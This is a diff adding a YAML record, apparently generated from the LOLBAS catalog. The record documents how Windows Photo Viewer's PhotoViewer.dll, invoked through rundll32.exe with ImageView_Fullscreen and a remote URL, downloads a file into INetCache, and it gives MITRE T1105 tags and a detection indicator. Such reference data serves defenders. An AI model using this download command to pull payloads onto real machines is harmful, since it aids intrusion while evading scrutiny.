@@ -1,0 +1,94 @@
+id: lolbas/T1NMaWJyYXJpZXMvUGhvdG9WaWV3ZXIueW1s/RG93bmxvYWQ/0
+type: library
+platform: windows
+name: PhotoViewer.dll
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote URL (containing '://')
+    as an argument
+commands:
+- template: rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen
+    {REMOTEURL}
+  comment: Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache
+    folder using the Windows Photo Viewer DLL.
+references:
+- https://lolbas-project.github.io/lolbas/Libraries/PhotoViewer/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: PhotoViewer.dll
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSLibraries/PhotoViewer.yml
+      command_source_index: 0
+      document_utf8: "---\nName: PhotoViewer.dll\nDescription: Windows Photo Viewer\nAuthor: Avihay Eldad\n\
+        Created: 2025-06-22\nCommands:\n  - Command: rundll32.exe \"C:\\Program Files\\Windows Photo Viewer\\\
+        PhotoViewer.dll\",ImageView_Fullscreen {REMOTEURL}\n    Description: Once executed, rundll32.exe\
+        \ will download the file at the specified URL to the user's INetCache folder using the Windows\
+        \ Photo Viewer DLL.\n    Usecase: Download file from remote location.\n    Category: Download\n\
+        \    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n\
+        \      - Download: INetCache\nFull_Path:\n  - Path: C:\\Program Files\\Windows Photo Viewer\\\
+        PhotoViewer.dll\n  - Path: C:\\Program Files (x86)\\Windows Photo Viewer\\PhotoViewer.dll\nDetection:\n\
+        \  - IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote URL (containing '://')\
+        \ as an argument\nAcknowledgement:\n  - Person: Avihay Eldad\n    Handle: '@avihayeldad'\n  -\
+        \ Person: Tommy Warren\n"
+      document_sha256: sha256:f0825607854162f65757fd6c0e16bfbce28fe42cab13403a22cb2653db2207c3
+    upstream_url: https://lolbas-project.github.io/lolbas/Libraries/PhotoViewer/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:ab7b1f3676e9e2db3ed4293eaf3f4803f6dddaef4c420def3608ea146bf6a2e8
